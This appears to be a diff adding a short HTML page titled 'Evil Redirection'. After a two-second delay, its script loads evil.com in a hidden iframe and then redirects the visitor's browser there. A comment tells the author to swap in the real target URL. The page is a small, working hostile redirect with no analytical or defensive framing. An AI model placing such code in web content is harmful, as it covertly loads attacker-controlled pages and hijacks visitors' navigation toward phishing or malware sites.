@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Evil Redirection</title>
+</head>
+<body>
+
+  <script>
+    setTimeout(function() {
+      const iframe = document.createElement('iframe');
+      iframe.src = 'https://evil.com'; // Replace with the actual URL
+      iframe.style.display = 'none'; // Hide the iframe
+
+      document.body.appendChild(iframe);
+
+      // Wait for the iframe to load content, then redirect
+      iframe.onload = function() {
+        window.location.href = iframe.src;
+      };
+    }, 2000);
+  </script>
+</body>
+</html>
